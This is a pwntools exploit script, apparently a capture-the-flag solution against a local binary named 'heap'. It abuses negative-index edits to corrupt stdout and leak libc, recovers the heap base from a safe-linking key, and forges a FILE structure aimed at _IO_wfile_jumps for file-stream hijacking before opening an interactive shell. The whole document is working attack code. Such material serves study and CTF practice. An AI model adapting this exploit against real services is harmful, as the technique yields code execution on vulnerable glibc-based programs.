# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './heap'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('CHOICE:',num)

def add():
    cmd(1)

def edit(idx ,size, text):
    cmd(2)
    sla('INDEX:' , idx)
    sla('SIZE:' , size)
    sa('CONTENT:' , text)

def show(idx ):
    cmd(3)
    sla('INDEX:' , idx)

def delete(idx ):
    cmd(4)
    sla('INDEX:' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    add()
    payload = flat(
        0xfbad1800 , 0,
        0 , 0,
    )

    # dbg()
    edit(-8 , 0x20 , payload)
    
    libc.address = l64() - 0x1f5720
    libc_base = libc.address
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x1f5720

    add()
    delete(0)
    add()
    show(0)

    rl()
    key = uu64(5)
    heap_base = key << 12

    lg('heap_base' ,heap_base)

    edit(0 , 0x80 , p64(0x90))
    
    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_write_ptr = 0xa81,
        _wide_data = heap_base + 0xe0 ,
    ) + p64(_IO_wfile_jumps)

    edit(-4 , 0x20 , file)

    target = heap_base + 0x498
    offset = 0x29 + 5 + 6 + 1
    payload = p64(0xfbad1800)+p64(0)*6+p64(target - offset)+p64(target)

    edit(-8 , 0x20 , payload)
    # dbg()


    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   heap.py
@Time    :   2022/08/03 14:50:54
@Author  :   Niyah 
'''